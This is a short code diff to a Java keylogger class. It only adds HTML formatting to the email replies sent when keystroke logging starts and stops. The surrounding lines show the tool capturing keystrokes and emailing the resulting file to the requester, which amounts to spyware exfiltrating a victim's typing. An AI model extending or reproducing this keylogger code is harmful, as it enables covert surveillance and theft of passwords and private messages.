@@ -72,7 +72,7 @@ public class KeyLogger implements NativeKeyListener {
         }
         SendMail.serversendEmail(from, "Reply for request: Start keylogger", "",
                 HTMLGenerator.generateHTML("Your request has been completed successfully!", "",
-                        "Key logger has started"));
+                        "<b>Key logger has started</b>"));
     }
 
     public static void stopKeylogger(String from) {
@@ -91,7 +91,7 @@ public class KeyLogger implements NativeKeyListener {
         SendMail.serversendEmail(from, "Reply for request: Stop keylogger", file.toString(),
                 HTMLGenerator.generateHTML("Your request has been completed successfully", "",
                         """
-                                 The keylogger has stopped. 
+                                 <b>The keylogger has stopped</b>.<br> 
                                  The file below contains the captured keystrokes.
                                 """));
     }
